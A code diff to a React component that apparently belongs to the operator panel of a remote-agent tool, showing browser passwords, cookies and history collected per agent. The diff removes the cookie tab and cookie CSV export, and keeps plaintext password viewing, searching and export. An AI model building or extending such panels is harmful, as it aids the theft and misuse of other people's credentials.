@@ -3,7 +3,7 @@ import { useTranslation } from 'react-i18next';
 import { Button, Skeleton, Tabs, Chip, Accordion } from '@heroui/react';
 import { Eye, EyeSlash, ArrowRotateLeft, ChevronDown, Globe, Magnifier, ArrowDownToLine } from '@gravity-ui/icons';
 import { getBrowser, searchBrowser } from '../../api/othersoft';
-import type { BrowserPassword, BrowserCookie, BrowserHistory, BrowserDataType } from '../../types/models';
+import type { BrowserPassword, BrowserHistory, BrowserDataType } from '../../types/models';
 
 interface BrowserTabProps {
   agentId: string;
@@ -104,7 +104,7 @@ export function BrowserTab({ agentId }: BrowserTabProps) {
   // Search state
   const [searchKeyword, setSearchKeyword] = useState('');
   const [searchLoading, setSearchLoading] = useState(false);
-  const [searchResults, setSearchResults] = useState<BrowserPassword[] | BrowserCookie[] | BrowserHistory[] | null>(null);
+  const [searchResults, setSearchResults] = useState<BrowserPassword[] | BrowserHistory[] | null>(null);
   const [searchTotal, setSearchTotal] = useState(0);
   const [searchError, setSearchError] = useState<string | null>(null);
 
@@ -112,21 +112,14 @@ export function BrowserTab({ agentId }: BrowserTabProps) {
   const [showExportMenu, setShowExportMenu] = useState(false);
 
   const pw = usePagedData<BrowserPassword>(agentId, 'passwords');
-  const ck = usePagedData<BrowserCookie>(agentId, 'cookies');
   const hs = usePagedData<BrowserHistory>(agentId, 'history');
 
-  // Filter out entries where url, username, and password are all empty
   const filteredPasswords = useMemo(() => {
     const source = searchResults && subTab === 'passwords'
       ? (searchResults as BrowserPassword[])
       : pw.items;
     return source.filter(p => p.url || p.username || p.password);
   }, [pw.items, searchResults, subTab]);
-
-  const filteredCookies = useMemo(() => {
-    if (searchResults && subTab === 'cookies') return searchResults as BrowserCookie[];
-    return ck.items;
-  }, [ck.items, searchResults, subTab]);
 
   const filteredHistory = useMemo(() => {
     if (searchResults && subTab === 'history') return searchResults as BrowserHistory[];
@@ -140,20 +133,19 @@ export function BrowserTab({ agentId }: BrowserTabProps) {
     setSearchResults(null);
     setSearchKeyword('');
     setSearchError(null);
-    const store = key === 'passwords' ? pw : key === 'cookies' ? ck : hs;
+    const store = key === 'passwords' ? pw : hs;
     if (store.initialLoading && store.items.length === 0) store.fetchPage(true);
-  }, [pw, ck, hs]);
+  }, [pw, hs]);
 
   const handleRefresh = useCallback(() => {
     setSearchResults(null);
     setSearchKeyword('');
     setSearchError(null);
-    const store = subTab === 'passwords' ? pw : subTab === 'cookies' ? ck : hs;
+    const store = subTab === 'passwords' ? pw : hs;
     store.reset();
     setTimeout(() => store.fetchPage(true), 0);
-  }, [subTab, pw, ck, hs]);
+  }, [subTab, pw, hs]);
 
-  // Search handler - sends to agent
   const handleSearch = useCallback(async () => {
     const keyword = searchKeyword.trim();
     if (!keyword) return;
@@ -161,7 +153,7 @@ export function BrowserTab({ agentId }: BrowserTabProps) {
     setSearchError(null);
     setSearchResults(null);
     try {
-      const dataType: BrowserDataType = subTab === 'passwords' ? 'passwords' : subTab === 'cookies' ? 'cookies' : 'history';
+      const dataType: BrowserDataType = subTab === 'passwords' ? 'passwords' : 'history';
       const res = await searchBrowser(agentId, dataType, keyword);
       setSearchResults(res.items ?? []);
       setSearchTotal(res.total);
@@ -172,7 +164,6 @@ export function BrowserTab({ agentId }: BrowserTabProps) {
     }
   }, [agentId, subTab, searchKeyword]);
 
-  // Export handler
   const handleExport = useCallback((exportAll: boolean) => {
     setShowExportMenu(false);
 
@@ -183,13 +174,6 @@ export function BrowserTab({ agentId }: BrowserTabProps) {
         ['Browser', 'URL', 'Username', 'Password', 'Version'],
         data.map(p => [p.browser, p.url, p.username, p.password, p.version])
       );
-    } else if (subTab === 'cookies') {
-      const data = exportAll ? ck.items : filteredCookies;
-      downloadCsv(
-        `browser_cookies${searchKeyword ? '_search' : ''}.csv`,
-        ['Browser', 'Domain', 'Name', 'Value', 'Version'],
-        data.map(c => [c.browser, c.host, c.name, c.value, c.version])
-      );
     } else {
       const data = exportAll ? hs.items : filteredHistory;
       downloadCsv(
@@ -198,9 +182,8 @@ export function BrowserTab({ agentId }: BrowserTabProps) {
         data.map(h => [h.browser, h.url, h.title, h.visits])
       );
     }
-  }, [subTab, pw.items, ck.items, hs.items, filteredPasswords, filteredCookies, filteredHistory, searchKeyword]);
+  }, [subTab, pw.items, hs.items, filteredPasswords, filteredHistory, searchKeyword]);
 
-  // Group passwords by domain
   const passwordsByDomain = useMemo(() => {
     const map = new Map<string, (BrowserPassword & { key: string })[]>();
     for (let i = 0; i < filteredPasswords.length; i++) {
@@ -212,18 +195,6 @@ export function BrowserTab({ agentId }: BrowserTabProps) {
     }
     return [...map.entries()].sort((a, b) => b[1].length - a[1].length);
   }, [filteredPasswords]);
-
-  // Group cookies by host
-  const cookiesByHost = useMemo(() => {
-    const map = new Map<string, (BrowserCookie & { key: string })[]>();
-    for (let i = 0; i < filteredCookies.length; i++) {
-      const c = filteredCookies[i]!;
-      const host = c.host || '(other)';
-      if (!map.has(host)) map.set(host, []);
-      map.get(host)!.push({ ...c, key: `${i}` });
-    }
-    return [...map.entries()].sort((a, b) => b[1].length - a[1].length);
-  }, [filteredCookies]);
 
   const historyByHost = useMemo(() => {
     const source = searchResults && subTab === 'history'
@@ -240,9 +211,9 @@ export function BrowserTab({ agentId }: BrowserTabProps) {
     return [...map.entries()].sort((a, b) => b[1].length - a[1].length);
   }, [hs.items, searchResults, subTab]);
 
-  const currentErrors = subTab === 'passwords' ? pw.errors : subTab === 'cookies' ? ck.errors : hs.errors;
+  const currentErrors = subTab === 'passwords' ? pw.errors : hs.errors;
   const isSearching = searchResults !== null;
-  const currentTotal = isSearching ? searchTotal : (subTab === 'passwords' ? pw.total : subTab === 'cookies' ? ck.total : hs.total);
+  const currentTotal = isSearching ? searchTotal : (subTab === 'passwords' ? pw.total : hs.total);
 
   if (pw.initialLoading && subTab === 'passwords') {
     return (
@@ -260,7 +231,6 @@ export function BrowserTab({ agentId }: BrowserTabProps) {
       <div className="flex items-center justify-between">
         <div className="flex gap-2">
           <Chip variant="soft" color="accent">{t('othersoft.browser.passwords')}: {pw.total}</Chip>
-          <Chip variant="soft" color="warning">{t('othersoft.browser.cookies')}: {ck.total}</Chip>
           <Chip variant="soft" color="default">{t('othersoft.browser.history')}: {hs.total}</Chip>
         </div>
         <div className="flex gap-2 items-center">
@@ -270,7 +240,6 @@ export function BrowserTab({ agentId }: BrowserTabProps) {
           <Button size="sm" variant="ghost" onPress={handleRefresh}>
             <ArrowRotateLeft className="w-4 h-4" />
           </Button>
-          {/* Export button */}
           <div className="relative">
             <Button size="sm" variant="ghost" onPress={() => setShowExportMenu(v => !v)}>
               <ArrowDownToLine className="w-4 h-4" />
@@ -338,7 +307,6 @@ export function BrowserTab({ agentId }: BrowserTabProps) {
         <Tabs.ListContainer>
           <Tabs.List aria-label="Browser data">
             <Tabs.Tab id="passwords">{t('othersoft.browser.passwords')}<Tabs.Indicator /></Tabs.Tab>
-            <Tabs.Tab id="cookies">{t('othersoft.browser.cookies')}<Tabs.Indicator /></Tabs.Tab>
             <Tabs.Tab id="history">{t('othersoft.browser.history')}<Tabs.Indicator /></Tabs.Tab>
           </Tabs.List>
         </Tabs.ListContainer>
@@ -390,53 +358,6 @@ export function BrowserTab({ agentId }: BrowserTabProps) {
           )}
         </Tabs.Panel>
 
-        <Tabs.Panel id="cookies">
-          {filteredCookies.length === 0 && !ck.loading ? (
-            <div className="text-center text-neutral-500 py-8">{t('othersoft.browser.noData')}</div>
-          ) : (
-            <div className="max-h-[600px] overflow-y-auto">
-              <Accordion className="w-full">
-                {cookiesByHost.map(([host, items]) => (
-                  <Accordion.Item key={host}>
-                    <Accordion.Heading>
-                      <Accordion.Trigger>
-                        <span className="mr-3 size-4 shrink-0 text-muted"><Globe /></span>
-                        <span className="flex-1 text-left">{host}</span>
-                        <Chip size="sm" variant="soft" className="mr-2">{items.length}</Chip>
-                        <Accordion.Indicator><ChevronDown /></Accordion.Indicator>
-                      </Accordion.Trigger>
-                    </Accordion.Heading>
-                    <Accordion.Panel>
-                      <Accordion.Body>
-                        <table className="w-full text-sm">
-                          <thead>
-                            <tr className="border-b border-neutral-200 dark:border-neutral-700">
-                              <th className="text-left py-1.5 px-2">{t('othersoft.browser.source')}</th>
-                              <th className="text-left py-1.5 px-2">{t('othersoft.browser.cookieName')}</th>
-                              <th className="text-left py-1.5 px-2">{t('othersoft.browser.cookieValue')}</th>
-                              <th className="text-left py-1.5 px-2">{t('othersoft.browser.expires')}</th>
-                            </tr>
-                          </thead>
-                          <tbody>
-                            {items.map((c) => (
-                              <tr key={c.key} className="border-b border-neutral-100 dark:border-neutral-800">
-                                <td className="py-1.5 px-2"><Chip size="sm" variant="soft">{c.browser}</Chip></td>
-                                <td className="py-1.5 px-2">{c.name}</td>
-                                <td className="py-1.5 px-2 max-w-[200px] truncate font-mono text-xs" title={c.value}>{c.value}</td>
-                                <td className="py-1.5 px-2 text-xs">{c.expires > 0 ? new Date(c.expires / 1000).toLocaleDateString() : '-'}</td>
-                              </tr>
-                            ))}
-                          </tbody>
-                        </table>
-                      </Accordion.Body>
-                    </Accordion.Panel>
-                  </Accordion.Item>
-                ))}
-              </Accordion>
-              {!isSearching && <ScrollLoader loading={ck.loading} hasMore={ck.hasMore.current} onLoadMore={() => ck.fetchPage()} />}
-            </div>
-          )}
-        </Tabs.Panel>
         <Tabs.Panel id="history">
           {filteredHistory.length === 0 && !hs.loading ? (
             <div className="text-center text-neutral-500 py-8">{t('othersoft.browser.noData')}</div>
